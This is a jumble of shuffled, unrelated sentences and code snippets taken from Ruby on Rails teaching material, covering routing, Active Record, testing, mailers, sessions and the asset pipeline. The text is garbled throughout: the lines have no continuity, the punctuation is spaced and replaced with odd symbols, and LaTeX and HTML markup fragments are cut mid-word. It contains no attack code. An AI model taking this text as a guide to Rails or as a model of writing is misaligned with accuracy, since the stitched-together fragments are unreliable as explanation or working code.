Action Mailer allows you to send emails from your application using mailer classes ╼ and views ▖
in Listing ~ \ ref { code : will _ paginate _ gem } .
The method `redefine _ method` prevents such a potential warning , removing the existing method before if needed .
Moving the \ kode { signed \ _ in \ _ user } method into the Sessions helper .
This module provides methods for generating container tags , such as `div` , for your record ▖
&#124; &#124; 304 &#124; : not _ modified &#124;
The first step in our refactoring is to replace the user ~ \ kode { li } from Listing ~ \ ref { code : will _ paginate _ index _ view } with a \ kode { render } call ( Listing ~ \ ref { code : index _ view _ first _ refactoring } ) .
AppName : : Application ▖ config ▖ session _ store : cookie _ store , key : &apos; SOMETHINGNEW&apos;
To avoid cluttering the templates with boilerplate code , a number of helper classes provide common behavior for forms , dates , and strings ▖
&#124; GET &#124; / photos / : id / edit &#124; images # edit &#124; edit _ photo _ path ( : id ) &#124;
The page is identical to Figure ~ \ ref { fig : hello _ world _ first _ app } , but now it &apos;s running in a production environment on the live web .
RESTful routes provided by the Microposts resource in Listing ~ \ ref { code : demo _ microposts _ resource } .
Active Support extends slicing to hashes :
Because of the way Ruby handles assignments inside objects , without \ kode { self } the assignment would create a \ emph { local } variable called \ kode { remember \ _ token } , which isn &apos;t what we want at all .
Email clients have no web context and so paths have no base URL to form complete ╼ web addresses ▖
Form With Errors &#93; ( images / getting _ started / form _ with _ errors ▖ png )
If the index is greater than the length of the array , it returns an empty array .
If we want to display the properties of all the books in our view , we can do so with an ERB template like this :
def full _ messages
includes the enclosed line only if the version of Microsoft Internet Explorer ~ ( IE ) is less than ~ 9 ( \ kode { if lt IE 9 } ) .
This is necessary because there is no way for a browser to visit the \ kode { update } action directly---it can only get there indirectly by submitting the edit form---so Capybara can &apos;t do it either .
( In this context , I recommend taking a look at \ href { http : / / railscasts ▖ com / episodes / 275-how-i-test } { the RailsCast on ``How I test &apos; &apos; } .
Existing signed cookies generated with Rails 3 ▖ x will be transparently upgraded if you leave your existing `secret _ token` in place and add the new `secret _ key _ base` .
All of them accept the ` : on` and ` : message` options , which define when the ╼ validation should be run and what message should be added to the `errors` ╼ collection if it fails , respectively ▖
We then make 50 microposts for each user ( plenty to overflow the pagination limit of ~ 30 ) , generating sample content for each micropost using the Faker gem &apos;s handy \ href { http : / / rubydoc ▖ info / gems / faker / 1 ▖ 3 ▖ 0 / Faker / Lorem } { \ texttt { Lorem ▖ sentence } method } .
The User data model with an added \ kode { password \ _ digest } attribute .
One of the results of the \ kode { generate } command in Listing ~ \ ref { code : generate _ user _ model } is a new file called a \ emph { migration } .
# # # # `in _ groups ( number , fill _ with = nil ) `
Also check your environment settings for `config ▖ action _ dispatch ▖ best _ standards _ support` and remove it if present .
A user profile with an unfollow button ( \ href { http : / / localhost : 3000 / users / 8 } { / users / 6 } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ unfollow _ button _ bootstrap-full ▖ png } { ( full size ) }
Rails also creates a default `app / assets / stylesheets / application ▖ css` file ╼ which contains these lines :
As noted , \ kode { @ user ▖ microposts ▖ count } is the analogue of the \ kode { User ▖ count } method , except that it counts the microposts belonging to a given user through the user / micropost association .
# Generate a new token and store it in token _ file .
# # # # Examples from the Underground
# = &gt; ActiveRecord : : RecordNotFound
As we &apos;ll see in Section ~ \ ref { sec : email _ in _ production } , account activation and password reset include some common email configuration , which we &apos;ll want to apply to both features before merging to master .
WHERE follower _ id = : user _ id &quot;
( The \ kode { -e } here arranges to run just the examples whose description strings match \ kode { &quot; signup page &quot; } .
Finally , routes will also be isolated within the engine ▖
# # # Pessimistic Locking
# # # # radio _ button _ tag
request ▖ remote _ ip ) }
Note that you will \ emph { not } receive an actual email in a development environment , but it will show up in your server logs .
The \ kode { update } action needed to get the tests in Listing ~ \ ref { code : successful _ edit _ test } to pass is similar to the final form of the \ kode { create } action ( Listing ~ \ ref { code : login _ upon _ signup } ) , as seen in Listing ~ \ ref { code : user _ update _ action } .
We &apos;ve covered a lot of ground in this chapter , transforming our promising but unformed application into a site capable of the full suite of registration and login behaviors .
# # # Specifying Constraints
def run
This is a Ruby convention indicating that the return value is \ emph { boolean } : \ kode { true } or \ kode { false } .
# # # Specifying a Controller to Use
It takes as arguments the text of the link and an optional \ kode { : href } parameter , so that
The matcher assigns segments to parameters in an intuitive way ▖
# Redirects to stored location ( or to the default ) .
path _ suffix = qualified _ name ▖ underscore
With that , our layout has links to all the static pages created in Chapter ~ \ ref { cha : static _ pages } , so that , for example , \ href { http : / / localhost : 3000 / about } { / about } goes to the About page ( Figure ~ \ ref { fig : about _ page } ) .
As you might guess , the files allow us to mix JavaScript and Embedded Ruby to perform actions on the current page .
foreign _ key : &quot; manager _ id &quot;
As we proceed , it may help to refer to Table ~ \ ref { table : user _ urls } , which shows the correspondence between pages and URLs .
# # # Active Record
Go ╼ ahead and run the migration :
No big deal , but not clean either .
For example , here &apos;s a small section of the `rake routes` output for a RESTful route :
These tests introduce ( via the RSpec boolean convention ) the array \ kode { include ? } \ method , which simply checks if an array includes the given element
umerate } ╼ ╼ % subsection unsuccessful _ edits ( end ) ╼ ╼ \ subsection { Testing unsuccessful edits } % ( fold ) ╼ \ label { sec : testing _ unsuccessful _ edits } ╼ ╼
Change ` : username` in the route definition if you do not want your parameter name to be ` : username` .
It &apos;s not necessary to understand the results in detail , but viewing the routes in this manner gives us a high-level overview of the actions supported by our application .
Locking Records for Update
# # # # # `order`
By referring to the methods in Table ~ \ ref { table : association _ methods _ relationships } , we can write the \ kode { follow } , \ kode { unfollow } , and \ kode { following ? } \ methods using the association with \ kode { following } , as shown in Listing ~ \ ref { code : follow _ unfollow _ following } .
# # # # `parents`
The \ kode { create \ _ table } method accepts a block ( Section ~ \ ref { sec : blocks } ) with one block variable , in this case called \ kode { t } ( for ``table &apos; &apos; ) .
* Filters can be specified with a block or a symbol to a method in the mailer ╼ class similar to controllers .
git commit : % Q { -m &apos; Initial commit &apos; }
# &lt; / contributors &gt;
The email will automatically be available in the \ kode { edit } action because of its presence in the link above , but after we submit the form its value will be lost .
Returns an input tag of the &quot; email &quot; type tailored for accessing a specified attribute .
Sublime Text can be obtained commercially , whereas Vim can be obtained at no cost ; both are industrial-strength editors , but in my experience Sublime Text is \ emph { much } more accessible to beginners .
The first parameter of `form _ for` can be an object , say , ` @ article` which would ╼ cause the helper to fill in the form with the fields of the object ▖
= &gt; &quot; Hartl &quot;
module FixtureFileHelpers
For example , an HTML file using the ERB template system will have ` ▖ html ▖ erb` as a file extension .
We then fill it with the contents shown in Listing ~ \ ref { code : sample _ app _ readme } .
If it &apos;s been over a week , and you haven &apos;t heard anything , you might want to try ╼ and nudge things along ▖
The `config / database ▖ yml` file contains sections for three different environments in which Rails can run by default :
Typically a string or symbol ▖
We &apos;ll start by giving users the ability to update their profiles , which will also provide a natural opportunity to enforce an authorization model ( made possible by the authentication code in Chapter ~ \ ref { cha : log _ in _ log _ out } ) .
Client ▖ maximum ( &quot; age &quot; )
The `stylesheet _ link _ tag` helper returns an HTML ` &lt; link &gt; ` tag for each source provided .
In this section , we &apos;ll add the \ href { http : / / www ▖ answers ▖ com / penultimate } { penultimate } user action , the \ kode { index } action , which is designed to display \ emph { all } the users instead of just one .
* What Object Relational Mapping and Active Record are and how they are used in ╼ Rails .
Moreover , since we &apos;ll be using email addresses as unique usernames when users sign in , we shouldn &apos;t allow email duplicates in the database .
We can get these tests to pass by running the microposts migration and preparing the test database :
create _ table : physicians do &#124; t &#124;
Local compilation allows you to commit the compiled files into source control , ╼ and deploy as normal .
Does the same as `collection ▖ create` , but raises `ActiveRecord : : RecordInvalid` if the record is invalid .
# # # Working with Keys
--------------------------
Note that the final two expressions are equivalent , but I prefer the interpolated version ; having to add the single space \ kode { &quot; ~ &quot; } seems a bit awkward .
with the equivalent
The user show view with name and Gravatar .
&quot; Time &quot; = &gt; &quot; datetime &quot;
WARNING ▖ Keys should normally be unique ▖
( Readers familiar with Rails ~ 2 ▖ x should note that \ kode { form \ _ for } uses the ``percent-equals &apos; &apos; ERb syntax for inserting content ;
This is the &quot; C &quot; and the &quot; R &quot; from CRUD : ╼ creation and reading ▖
&#91; `form _ for` &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / FormHelper ▖ html # method-i-form _ for ) ╼ is a helper that assists with writing forms ▖
As with the first application , I suggest updating the \ kode { README } file ( located in the root directory of the application ) to be more helpful and descriptive .
Listing ~ \ ref { code : valid _ user _ test } uses the plain \ kode { assert } method , which in this case succeeds if \ kode { @ user ▖ valid ? } returns \ kode { true } and fails if it returns \ kode { false } .
# # # # javascript _ tag
silence _ warnings { Object ▖ const _ set &quot; RAILS _ DEFAULT _ LOGGER &quot; , logger }
_ For example when you display the user agent in an administration area .
( At this point , I also recommend removing the \ kode { hello } action from the Application controller if you added it in Section ~ \ ref { sec : sample _ app _ setup } ▖ )
length : { minimum : 5 }
The jQuery library ( which we saw briefly in Section ~ \ ref { sec : image _ validation } ) provides a large number of methods for manipulating the DOM , but here we will need only two .
I particularly recommend installing \ href { http : / / nodejs ▖ org / } { Node ▖ js } ▖ )
The view should just display that information ▖ ╼
General Advice
As usual , we &apos;ll make a topic branch for the new feature .
d ▖ monday # = &gt; Mon , 03 May 2010
User ▖ where ( id : 1 ) ▖ joins ( : articles ) ▖ explain
&#124; GET &#124; / photos / new &#124; photos # new &#124; return an HTML form for creating a new photo &#124;
real 0m2 ▖ 649s
When this option is true , digests will be generated for asset URLs .
Here the \ kode { : page } parameter comes from \ kode { params &#91; : page &#93; } , which is generated automatically by \ kode { will \ _ paginate } .
As with model inheritance , by inheriting ultimately from \ kode { ActionController : : Base } both the Users and Microposts controllers gain a large amount of functionality , such as the ability to manipulate model objects , filter inbound HTTP requests , and render views as HTML .
One can use the `ActionView : : render` method via `render template : &apos; layouts / news &apos; ` to base a new layout on the News layout ▖
123 ▖ to _ s ( : human _ size ) # = &gt; 123 Bytes
def attr _ internal _ reader ( * attrs )
# instance variable .
WARNING : If you &apos;re precompiling your assets ( see &#91; In Production &#93; ( # in-production ) ╼ below ) , linking to an asset that does not exist will raise an exception in the ╼ calling page ▖
Comparing Listing ~ \ ref { code : demo _ user _ class } and Listing ~ \ ref { code : demo _ micropost _ class } , we see that both the User model and the Micropost model inherit ( via the left angle bracket ~ \ kode { &lt; } ) from \ kode { ActiveRecord : : Base } , which is the base class for models provided by ActiveRecord ; a diagram summarizing this relationship appears in Figure ~ \ ref { fig : demo _ model _ inheritance } .
Taken together , the material in Chapter ~ \ ref { cha : modeling _ users } through Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } develops a full Rails login and authentication system .
( The other main possibilities listed in the \ href { https : / / github ▖ com / carrierwaveuploader / carrierwave # using-minimagick } { CarrierWave documentation on MiniMagick } \ emph { stretch } images if they &apos;re too small , which isn &apos;t what we want in this case ▖ )
If you like , you can verify that the form shown in Figure ~ \ ref { fig : home _ with _ form } is working by submitting a valid entry and then navigating to the \ href { http : / / localhost : 3000 / users / 1 } { profile page } to see the post , but that &apos;s rather cumbersome .
A route for the signup page .
* If `value` is a hash there &apos;s a recursive call with `key` as ` : root` .
We can do this using the \ kode { respond \ _ to } method , responding appropriately depending on the type of request ▖ The general pattern looks like this :
def process ( action , params = nil , session = nil , flash = nil , http _ method = &apos; GET &apos; )
first _ name : &apos; Andy &apos; )
&lt; h2 &gt; Comments &lt; / h2 &gt;
&lt; title &gt; Welcome !
Page 2 of the users index .
This loads arbitrary HTML and / or JavaScript from an external source and embeds it as part of the site ▖
The predicate `utc ? ` says whether the receiver has UTC as its time zone :
The \ kode { update \ _ attributes } method is an alias for the shorter \ kode { update } method , but I prefer the longer version because of its similarity to the singular version of the method , \ kode { update \ _ attribute } .
Switch to
If you don &apos;t need to do anything with the relationship model , it may be simpler to set up a `has _ and _ belongs _ to _ many` relationship ( though you &apos;ll need to remember to create the joining table in the database ) .
HTTP / 1 ▖ 1 200 OK Server : Cowboy
So , for example , page ~ 1 is users 1--30 , page ~ 2 is users 31--60 , etc ▖ If the page is \ kode { nil } , \ kode { paginate } simply returns the first page .
The XML serializer of models uses this method to dasherize node names :
The `config / database ▖ yml` file can contain ERB tags ` &lt; % = % &gt; ` ▖
Figure ~ \ ref { fig : user _ profile _ with _ microposts } shows the user profile page for the first user , while Figure ~ \ ref { fig : other _ profile _ with _ microposts } shows the profile for a second user .
\ href { http : / / www ▖ gotealeaf ▖ com / railstutorial } { Tealeaf Academy } : Lots of in-person developer bootcamps have sprung up in recent years , and I recommend looking for one in your area , but \ href { http : / / www ▖ gotealeaf ▖ com / railstutorial } { Tealeaf Academy } is available online and so can be taken from anywhere .
Of course , after this minor refactoring the test suite should still be \ passing :
But be warned : there &apos;s a \ emph { major } caveat , so don &apos;t just skim this section---read it carefully .
C : \ Sites \ sample _ app
in Listing ~ \ ref { code : generated _ account _ activation _ view _ text } and
If there are no associated objects , it returns an empty array .
In that case , we used a \ kode { before \ _ save } callback combined with the \ kode { downcase } method ( Listing ~ \ ref { code : email _ downcase } ) .
# # # # Copying
* * ` : table _ name` would make the primary key for the Customer class `customerid`
# = &gt; false
Variables that start with the \ kode { @ } ~ sign , called \ emph { instance variables } , are automatically available in the views ; in this case , the \ kode { index ▖ html ▖ erb } view in Listing ~ \ ref { code : demo _ index _ view } iterates through the \ kode { @ users } list and outputs a line of HTML for each one .
This uses the Rails convention of \ kode { id : @ user } , which ( as in controller redirects ) automatically uses \ kode { @ user ▖ id } .
getting _ users ( end ) ╼ ╼ \ subsection { Two subtle bugs } % ( fold ) ╼ \ label { sec : two _ subtle _ bugs } ╼ ╼
We &apos;ll start by generating an integration test for the profiles of our site &apos;s users :
form _ for @ geocoder , url : geocoder _ path do &#124; f &#124;
The above discussion implies that we will be adding a \ emph { second } occurrence of \ kode { user \ _ id } in the SQL query .
If you are using Mac OS X or Windows , you have a JavaScript runtime installed in ╼ your operating system ▖
resources : articles
There are many mostly equivalent possibilities---essentially , any large random string will do just fine , as long as it &apos;s unique .
/ / &#93; &#93; &gt;
Although it should be used with caution , the flexibility to add methods to built-in classes allows for extraordinarily natural additions to plain Ruby .
For our application &apos;s design choice , which involves \ emph { persistent } sessions---that is , signin status that lasts even after browser close---we need to use a \ emph { permanent } identifier for the signed-in user .
Quit the console .
In the case of the user we just created , we can try a couple of invalid passwords as follows :
# # # # Local Variables
&lt; % = render partial : &quot; product &quot; , object : @ item % &gt;
&#124; 1 &#124; SIMPLE &#124; users &#124; const &#124; PRIMARY &#124;
The Rails routes , with a new rule for Microposts resources .
When a test is especially short or simple compared to the application code it tests , lean toward writing the test first .
The results appear in Listing ~ \ ref { code : delete _ destroy _ test } .
See if you can figure out why we &apos;ve added a new test instead of just altering the current one .
We will need to construct some microposts in the User model test , which means that we should make a micropost factory at this point .
n &gt; ╼ \ end { enumerate } ╼ ╼ % subsection profile _ micropost _ tests ( end ) ╼ ╼ % section showing _ microposts ( end ) ╼ ╼ \ section { Manipulating microposts } % ( fold ) ╼ \ label { sec : manipulating _ microposts } ╼ ╼
We can visualize the result of this association in Figure ~ \ ref { fig : micropost _ user _ association } .
You should verify that clicking on the link in Figure ~ \ ref { fig : demo _ destroy _ user } destroys the second user , yielding an index page with only one user .
Having defined the relevant controller and route , now we &apos;ll fill in the view for new sessions , i ▖ e ▖ , the login form .
The About page with HTML structure removed ▖
As in Chapter ~ \ ref { cha : beginning } and Chapter ~ \ ref { cha : a _ toy _ app } , I suggest following the ``hello , world ! &apos; &apos;
The result is shown in Figure ~ \ ref { fig : sample _ app _ universal } .
In order to forward users to their intended destination , we need to store the location of the requested page somewhere , and then redirect to that location instead of to the default .
We &apos;ve also included a call to \ kode { assert \ _ template } to check that a failed submission re-renders the \ kode { new } action .
To login to the site , just follow this link : &lt; % = @ url % &gt; .
Note the arguments to \ kode { get } and \ kode { patch } involve code like
By using an email address as the username , we open the theoretical possibility of communicating with our users at a future date .
The \ kode { provide } function is its replacement .
See the Rails Guide on the \ href { http : / / guides ▖ rubyonrails ▖ org / active _ record _ querying ▖ html } { Active Record Query Interface } for more on \ kode { where } and related methods .
This tutorial will usually use the full \ kode { checkout } command , which works for systems that don &apos;t have \ kode { co } configured , but in real life I nearly always use \ kode { git co } .
&apos;X-Content-Type-Options &apos; = &gt; &apos; nosniff&apos;
The next step is to define a \ kode { destroy } action in the Microposts controller , which is analogous to the user case in Listing ~ \ ref { code : admin _ destroy _ before _ filter } .
As with the Users resource , we &apos;ll use an integration test :
* `nil` and `false` ,
The reason this works is that the \ kode { change } method knows that \ kode { drop \ _ table } is the inverse of \ kode { create \ _ table } , which means that the rollback migration can be easily inferred .
validates : content , length : {
We &apos;ll set about changing this in Chapter ~ \ ref { cha : filling _ in _ the _ layout } .
Does not work in combination with the ` : through` or ` : as` options .
# Ignore the default SQLite database .
The error page for / users / 1 ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ routing _ error-full ▖ png } { ( full size ) }
default to : Proc ▖ new { Admin ▖ pluck ( : email ) } ,
* `create _ with`
`config ▖ action _ view` includes a small number of configuration settings :
@ person = person
$ rails g
cd one directory up
The new signup page at \ href { http : / / localhost : 3000 / signup } { / signup } ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / new _ signup _ page _ bootstrap-full ▖ png } { ( full size ) }
Even more important , though , is that the core user persistence code is in fact completely untested at present .
In this case , the range &apos;s \ kode { each } method can handle a block with a single local variable , which we &apos;ve called ~ \ kode { i } , and it just executes the block for each value in the range .
* `after _ initialize` : Run directly after the initialization of the application , after the application initializers in `config / initializers` are run .
Write a test for the error messages implemented in Listing ~ \ ref { code : f _ error _ messages } .
# gem &apos; childprocess &apos; , &apos; 0 ▖ 3 ▖ 6&apos;
The Ruby JavaScript ( RJS ) to destroy a following relationship .
About the author
This simply arranges to follow the redirect after submission , resulting in a rendering of the \ kode { &apos; users / show &apos; } template .
in the previous exercise would catch it ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-90699b &apos; &gt; &lt; / span &gt; ╼ ╼ \ end { enumerate } ╼ ╼ % subsection following _ tests ( end ) ╼ ╼ % section a _ web _ interface _ for _ following _ and _ followers ( end ) ╼ ╼ \ section { The status feed } % ( fold ) ╼ \ label { sec : the _ status _ feed } ╼ ╼
A Guide for Upgrading Ruby on Rails
Setting this up is painfully simple .
The full list of options for the plugin generator may be seen by typing :
cd to home directory
In this section , we &apos;ll implement the users data model in Section ~ \ ref { sec : modeling _ demo _ users } , along with a web interface to that model .
config ▖ action _ mailer ▖ default _ url _ options = { host : &apos; example ▖ com &apos; }
These sorts of hashes-of-hashes , or \ emph { nested hashes } , are heavily used by Rails , as we &apos;ll see starting in Section ~ \ ref { sec : signup _ failure } .
# # # Engine setup
/ * typography * /
add _ index : publications , : publication _ type _ id
The `collection` method returns an array of all of the associated objects ▖
All methods defined in a class after \ kode { private } are automatically hidden , as seen in this console session :
WARNING : The precedence between model names is calculated using the ` &lt; ` operator for `String` ▖
* `created _ at` - Automatically gets set to the current date and time when the ╼ record is first created .
-
&quot; &quot; ▖ demodulize # = &gt; &quot; &quot;
Finally , the tests act as a \ emph { client } for the application code , often leading to more elegant software designs .
* `active _ record ▖ set _ dispatch _ hooks` Resets all reloadable connections to the database if `config ▖ cache _ classes` is set to `false` .
Just change it from its default ` &quot; localhost &quot; ` setting ▖ &lt; / li &gt;
We &apos;ll complete this task , and with it the sample application , in Chapter ~ \ ref { cha : following _ users } .
To get started with the implementation , we first generate a migration corresponding to Figure ~ \ ref { fig : relationship _ model } :
( As long as you pushed the corresponding repositories up to Bitbucket , you can always recover them later ▖ )
In the code
Having
Files in this directory are served by the Sprockets middleware .
In short , we shouldn &apos;t allow \ kode { name } and \ kode { email } to be just any strings ; we should enforce certain constraints on their values .
in Listing ~ \ ref { code : generalized _ current _ user } and
Although our sample app is a little too small to refactor right now , \ href { https : / / en ▖ wikipedia ▖ org / wiki / Code _ smell } { code smell } seeps in at every crack , and we &apos;ll get started refactoring in Section ~ \ ref { sec : layouts _ and _ embedded _ ruby } .
You define association callbacks by adding options to the association declaration ▖
* One article can have many comments .
To configure our application to use cloud storage in production , we &apos;ll use the \ texttt { fog } gem , as shown in Listing ~ \ ref { code : image _ uploader _ production } .
This isn &apos;t technically true---the scaffolding includes rudimentary tests---but the generated tests are ugly and inflexible , and they don &apos;t test for data validation , authentication , or any other custom requirements .
belongs _ to : magazine
class C ; end
The method `acts _ like ? ` provides a way to check whether some class acts like some other class based on a simple convention : a class that provides the same interface as `String` defines
\ emph { Note } : The \ emph { Solutions Manual for Exercises } , with solutions to every exercise in the \ emph { Ruby on Rails Tutorial } book , is included for free with every purchase at \ href { http : / / www ▖ railstutorial ▖ org / } { www ▖ railstutorial ▖ org } .
This is why , if your principal programming interest is writing web applications , I recommend learning Rails first , then learning Ruby , then looping back to Rails .
Adding image display to microposts .
Anything you can do to make bug reports more succinct or easier to reproduce is a help to folks trying to write code to fix those bugs - whether you end up writing the code yourself or not .
# # # Using a Class Provided by the Application
Before , jobs would look like this :
# ▖ ▖ .
If you are used to skipping around in technical books , taking this linear approach might require some adjustment , but I suggest giving it a try .
first : 1
In the present case , we need only one user , whose information should consist of a valid name and email address .
Client ▖ pluck ( : name )
To begin with , let &apos;s get some text up on screen quickly ▖
* `javascripts` turns on the hook for JavaScript files in generators ▖
This route doesn &apos;t ╼ exist at the moment , but can be created by changing the `resources : articles` line ╼ inside `config / routes ▖ rb` into these lines :
now = DateTime ▖ current # = &gt; Mon , 07 Jun 2010 20 : 26 : 36 + 0000
( Note that we &apos;ve just left the remember token blank ; it doesn &apos;t matter what its value is , because the error occurs before it ever gets used ▖ )
# # # # Using a Model Provided by the Application
is the submitted email address and
( You might also consider the \ href { http : / / mbsy ▖ co / 6VQ8l } { RSpec course at Code School } , which one reader has said answered a lot of his RSpec questions ▖ )
This evaluates to \ kode { session &#91; : forwarding \ _ url &#93; } unless it &apos;s \ kode { nil } , in which case it evaluates to the given default URL .
To call this `published` scope we can call it on either the class :
Following Twitter &apos;s lead , we &apos;ll plan to display a user &apos;s microposts not on a separate microposts \ kode { index } page but rather directly on the user \ kode { show } page itself , as mocked up in Figure ~ \ ref { fig : user _ microposts _ mockup } .
class Manifest &lt; ActiveRecord : : Base
As preparation for the deployment , you should merge your changes into the \ kode { master } branch at this point :
Here the \ kode { &apos; ▖ &apos; } is Unix for ``current directory &apos; &apos; , and \ kode { &apos; ▖ / example \ _ user &apos; } tells Ruby to look for an example user file relative to that location .
Getting started with testing can be challenging , requiring extensive knowledge of both Rails and Ruby .
* File names .
If the user is authenticated according to the booleans above , we need to activate the user and update the \ kode { activated \ _ at } timestamp :
Verify that you get the behavior shown in Figure ~ \ ref { fig : micropost _ content _ cant _ be _ blank } .
As long as you retain this notice you
The Static Pages controller test with title tests ▖
╼ User add some examples to ( or delete )
This code fetches data from &quot; / test &quot; , and then appends the result to the `div` ╼ with an id of `results` .
The main reason for this is that the default Rails page typically breaks at Heroku , which makes it hard to tell if the deployment was successful or not .
You can confirm that the test suite is now passing :
You can supply them as defaults :
The helper inside `app / helpers / blorgh / articles _ helper ▖ rb` is also namespaced :
In the next version , these errors will no longer be suppressed .
* `eager _ load`
Because newly activated users get redirected to their profile pages , we already have a test that the profile page renders correctly ( Listing ~ \ ref { code : signup _ with _ account _ activation _ test } ) .
The initial duplicate email test appears in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ test } .
The following should also be added to `Gemfile` :
Test for the password and password confirmation .
Now that we &apos;ve gotten to \ passing , we are free to refactor our code with confidence .
No test-driven development
person = Person ▖ new ( name : &quot; Andrea &quot; , email : &quot; andrea @ example ▖ com &quot; )
It ╼ will then use PushState to change the URL to the correct one , preserving ╼ refresh semantics and giving you pretty URLs .
( We &apos;ve used a CSS ~ id because we expect the site logo to appear on the page only once , but you could use a class instead ▖ )
NOTE : User defined rake tasks will run in the `development` environment by ╼ default ▖
} ╼ % = &lt; &lt; ( chapters / gemfiles / sample _ app / Gemfile , lang : ruby ) ╼ \ end { codelisting } ╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : user _ microposts _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
Does the same as `collection ▖ create` above , but raises `ActiveRecord : : RecordInvalid` if the record is invalid .
Correct tests for signin failure .
This way we can access the activation token using
Action View templates can be written in several ways ▖
Calvin navigates to the profile of a second user , Thomas Hobbes ( Figure ~ \ ref { fig : page _ flow _ other _ profile _ follow _ button } ) , clicking on the ``Follow &apos; &apos; button to follow that user .
# # # Using `root`
# # # Rails HTML Sanitizer
NOTE ▖ Because you &apos;re working in the development environment by default , this ╼ command will apply to the database defined in the `development` section of your ╼ `config / database ▖ yml` file ▖
d = &apos; ex-b87c82 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection users _ controller ( end ) ╼ ╼ \ subsection { Signup URL } % ( fold ) ╼ \ label { sec : signup _ url } ╼ ╼
The resulting login form appears in Figure ~ \ ref { fig : login _ form _ remember _ me } .
Note that you will have to pass the form variable ~ \ kode { f } explicitly as a local variable , as shown in Listing ~ \ ref { code : new _ user _ with _ partial } .
The user profile page with the default Gravatar .
# object called &quot; M &quot; , but it is a new instance .
params ▖ require ( : article ) ▖ permit ( : title , : text )
returns \ kode { &quot; 0 errors &quot; } , \ kode { &quot; 1 error &quot; } , \ kode { &quot; 2 errors &quot; } , and so on , depending on how many errors there are , thereby avoiding ungrammatical phrases such as \ kode { &quot; 1 errors &quot; } ( a distressingly common mistake in apps and on the Web ) .
$ git rebase rails / master
Authorization tests use both low-level commands to submit particular HTTP requests directly to controller actions and high-level integration tests .
WARNING : Additionally , objects will be destroyed if they &apos;re associated with `dependent : : destroy` , and deleted if they &apos;re associated with `dependent : : delete _ all` .
NOTE : Using `where` like this will only work when you pass it a Hash ▖
This ╼ namespace prevents code collisions , but often engine controllers need to access ╼ methods in the main application &apos;s `ApplicationController` ▖
Railties
e &apos; id = &apos; ex-98fcd3 &apos; &gt; &lt; / span &gt; ╼ ╼ \ end { enumerate } ╼ ╼ % subsection named _ routes ( end ) ╼ ╼ \ subsection { Layout link tests } % ( fold ) ╼ \ label { sec : layout _ link _ tests } ╼ ╼
$ git branch --track 4-0-stable origin / 4-0-stable
Active Job Basics
Thus , it combines the functions of `assert _ generates` and `assert _ recognizes` :
You can also provide a block to redirect , which receives the symbolized path parameters and the request object :
Order ▖ group ( : status ) ▖ count
I shall be late ! &quot; ▖ truncate ( 20 )
Sprockets uses files named `index` ( with the relevant extensions ) for a special ╼ purpose .
With the implementation in Listing ~ \ ref { code : remember _ me _ ternary } , our login system is complete , as you can verify by checking or unchecking the box in your browser .
As seen in Figure ~ \ ref { fig : user _ index _ all } , I &apos;ve taken the liberty of associating the first few sample addresses with Gravatars so that they &apos;re not all the default Gravatar image .
Create an S3 bucket ( with a name of your choice ) using the \ href { https : / / console ▖ aws ▖ amazon ▖ com / s3 } { AWS Console } , and then grant read and write permission to the user created in the previous step .
Putting everything together gives the pagination and delete test in Listing ~ \ ref { code : delete _ link _ integration _ test } , which includes tests for both admins and non-admins .
╼ is a project to make a book and screencasts to teach web development
You can check whether a module has a name with the predicate `anonymous ? ` :
The more generic form can also be used :
The page is identical to Figure ~ \ ref { fig : hello _ world _ hello _ app } , but now it &apos;s running in a production environment on the live web .
def create
&lt; h1 &gt; New zone &lt; / h1 &gt;
/ / ▖ ▖ .
We first invoke the console with \ kode { rails console } at the command line , and then retrieve the first user from the database using \ kode { User ▖ first } ( putting the results in the variable \ kode { first \ _ user } )
Item Load ( 0 ▖ 3ms ) SELECT * FROM `items` LIMIT 1 FOR UPDATE
As shown in Figure ~ \ ref { fig : invalid _ email _ password _ reset } , at this point the application &apos;s behavior for invalid email addresses is already working .
cp &lt; source &gt; &lt; target &gt;
Each helper accepts an arbitrary number of attribute names , so with a single ╼ line of code you can add the same kind of validation to several attributes .
╼ This is the sample application for the tutorial .
Edit the routes file from Listing ~ \ ref { code : hello _ root _ route } so that the root route goes to \ kode { goodbye } instead of to \ kode { hello } ( Figure ~ \ ref { fig : goodbye _ world } ) .
NOTE : The `sass-rails` gem is automatically used for CSS compression if included ╼ in Gemfile and no `config ▖ assets ▖ css _ compressor` option is set .
Configuring Rails Applications
If you wish , you can manually specify a URL inside of your `config / database ▖ yml`
@ article = Article ▖ new
Any method with a block will be treated as an XML markup tag with nested markup in the block ▖
Thanks to reader Paulo Célio Júnior for pointing this out .
&gt; &gt; 10 ▖ weeks ▖ ago
You should be able to refresh the pull request on GitHub and see that it has ╼ been updated .
in Listing ~ \ ref { code : title _ test } .
Once a method called `receive` is defined in any mailer , Action Mailer will ╼ parse the raw incoming email into an email object , decode it , instantiate a new ╼ mailer , and pass the email object to the mailer `receive` instance ╼ method ▖
All this talk about classes and inheritance may have triggered a flash of recognition , because we have seen both before , in the Static Pages controller ( Listing ~ \ ref { code : adding _ the _ about _ page } ) :
The `params` ╼ method returns an `ActiveSupport : : HashWithIndifferentAccess` object , which ╼ allows you to access the keys of the hash using either strings or symbols ▖
The initial user \ kode { update } action .
The ``forgot password &apos; &apos; form .
The second `Person` will not be persisted to the ╼ database .
The Static Pages controller with added \ kode { about } action ▖
It &apos;s also possible to override the column that should be used as the table &apos;s ╼ primary key using the `ActiveRecord : : Base ▖ primary _ key = ` method :
* Namespace isolation to `lib / blorgh / engine ▖ rb` :
The `collection ▖ clear` method removes every object from the collection by deleting the rows from the joining table ▖
You can also set this value through an &#91; environment ╼ variable &#93; ( http : / / en ▖ wikipedia ▖ org / wiki / Environment _ variable ) to make running a ╼ staging copy of your site easier :
* : conditions
def validate ( record )
See more
The User model with an added \ kode { password \ _ digest } attribute .
